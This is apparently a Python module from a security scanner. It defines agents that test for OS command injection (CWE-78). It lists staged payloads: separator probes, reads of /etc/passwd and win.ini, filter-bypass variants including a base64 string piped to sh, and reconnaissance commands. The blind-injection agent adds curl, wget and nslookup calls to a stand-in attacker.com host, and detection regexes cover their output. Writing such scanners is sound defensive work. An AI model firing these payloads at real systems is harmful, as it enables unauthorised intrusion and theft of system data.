"""Command Injection Agent - CWE-78."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class CMDiAgent(BaseAgent):
    """
    Command Injection testing agent.

    Tests for OS command injection vulnerabilities including:
    - Direct command injection
    - Blind command injection
    - Various shell metacharacters
    - Different OS command separators

    Payloads derived from ZAP's CommandInjectionScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "cmdi"

    @property
    def cweid(self) -> int:
        return 78

    @property
    def priority(self) -> int:
        return 10  # Critical priority - can lead to full system compromise

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic command separators
                ";id",
                "|id",
                "||id",
                "&id",
                "&&id",
                # Backticks and $()
                "`id`",
                "$(id)",
                # Newline injection
                "\nid",
                "\r\nid",
                # With input prefix
                "test;id",
                "test|id",
                "test`id`",
            ],
            PayloadStage.CONFIRM: [
                # Read specific files
                ";cat /etc/passwd",
                "|cat /etc/passwd",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                # Windows commands
                ";type C:\\Windows\\win.ini",
                "|type C:\\Windows\\win.ini",
                "&type C:\\Windows\\win.ini",
                # Echo test
                ";echo CMDINJECTION",
                "|echo CMDINJECTION",
                "$(echo CMDINJECTION)",
                # Environment variables
                ";echo $PATH",
                ";echo %PATH%",
            ],
            PayloadStage.EXPLOIT: [
                # User enumeration
                ";whoami",
                ";id",
                ";uname -a",
                # Network reconnaissance
                ";ifconfig",
                ";ip addr",
                ";netstat -an",
                # Process listing
                ";ps aux",
                ";tasklist",
                # Reverse shell indicators (safe versions)
                ";which nc",
                ";which bash",
                ";which python",
                # File system exploration
                ";ls -la /",
                ";dir C:\\",
                ";find / -perm -4000 2>/dev/null",
            ],
            PayloadStage.BYPASS: [
                # Space bypass
                ";cat${IFS}/etc/passwd",
                ";cat$IFS/etc/passwd",
                ";{cat,/etc/passwd}",
                # Quote bypass
                ";c''at /etc/passwd",
                ";c\"\"at /etc/passwd",
                # Variable concatenation
                ";c$()at /etc/passwd",
                # Hex encoding
                ";$(printf '\\x63\\x61\\x74') /etc/passwd",
                # Base64 bypass
                ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
                # Wildcard bypass
                ";/???/c?t /???/p??swd",
                # Double encoding
                "%3Bid",
                "%3B%69%64",
                # Null byte
                ";id%00",
                "test%00;id",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate command injection vulnerability."""
        patterns = [
            # /etc/passwd content
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"bin:.*:2:2:",
            r"nobody:.*:65534:",
            r"/bin/bash",
            r"/bin/sh",
            r"/usr/sbin/nologin",
            # win.ini content
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
            r"\[files\]",
            r"\[Mail\]",
            # Command output patterns
            r"uid=\d+\([^\)]+\)\s+gid=\d+",
            r"uid=\d+",
            r"gid=\d+",
            r"groups=\d+",
            # Linux system info
            r"Linux\s+\S+\s+\d+\.\d+",
            r"GNU/Linux",
            r"Ubuntu|Debian|CentOS|RedHat|Fedora",
            # Windows system info
            r"Windows\s+(NT|XP|Vista|7|8|10|11|Server)",
            r"Microsoft",
            # Network info
            r"inet\s+\d+\.\d+\.\d+\.\d+",
            r"eth\d+|ens\d+|wlan\d+",
            r"Local Area Connection",
            # Echo response
            r"CMDINJECTION",
            # Environment paths
            r"/usr/local/bin|/usr/bin|/bin",
            r"C:\\Windows|C:\\Program Files",
            # Process info
            r"PID\s+TTY\s+TIME",
            r"USER\s+PID\s+%CPU",
        ]
        return [re.compile(p, re.IGNORECASE | re.MULTILINE) for p in patterns]


class CMDiBlindAgent(CMDiAgent):
    """Specialized agent for blind command injection using timing."""

    @property
    def vulnerability_type(self) -> str:
        return "cmdi_blind"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                ";sleep 2",
                "|sleep 2",
                "$(sleep 2)",
                "`sleep 2`",
                # Windows
                "&timeout /t 2",
                "|timeout /t 2",
                # Ping-based
                ";ping -c 2 127.0.0.1",
                "&ping -n 2 127.0.0.1",
            ],
            PayloadStage.CONFIRM: [
                ";sleep 5",
                "|sleep 5",
                "$(sleep 5)",
                "&timeout /t 5",
                "&ping -n 5 127.0.0.1",
            ],
            PayloadStage.EXPLOIT: [
                # DNS-based exfiltration indicators
                ";nslookup attacker.com",
                ";curl http://attacker.com",
                ";wget http://attacker.com",
            ],
            PayloadStage.BYPASS: [
                ";sl''eep 2",
                ";sle${IFS}ep 2",
                "$(sl''eep 2)",
            ],
        }
